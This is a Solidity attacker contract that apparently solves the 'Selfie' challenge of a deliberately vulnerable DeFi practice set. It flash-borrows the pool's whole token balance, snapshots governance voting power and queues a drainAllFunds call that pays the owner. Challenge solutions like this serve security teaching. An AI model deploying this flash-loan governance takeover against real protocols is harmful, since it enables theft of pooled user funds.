// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieAttacker {
    address private immutable owner;
    SimpleGovernance private immutable governance;
    SelfiePool private immutable pool;
    DamnValuableTokenSnapshot private immutable tokenSnapshot;
    uint256 public actionId;

    constructor(address governance_, address pool_) {
        governance = SimpleGovernance(governance_);
        pool = SelfiePool(pool_);
        tokenSnapshot = SimpleGovernance(governance_).getGovernanceToken();
        owner = msg.sender;
    }

    function receiveTokens(address token, uint256 amount) external {
        // ensure the sender is correct
        require(msg.sender == address(pool), "must be pool");
        // ensure token address is correct
        require(token == address(tokenSnapshot), "must be the correct token");

        // take snapshot while you have the balance
        tokenSnapshot.snapshot();

        // with the tokens now snapshotted, we queue an action
        // action will be made towards the loan itself, it will be a call to `drainAllFunds(address receiver)`
        // the receiver will be you of course :)
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);

        // pay back your loan
        tokenSnapshot.transfer(address(pool), amount);
    }

    function pwn() external {
        // take their entire balance as a loan, why not
        pool.flashLoan(tokenSnapshot.balanceOf(address(pool)));
        // receiveTokens will be called as a result
    }
}
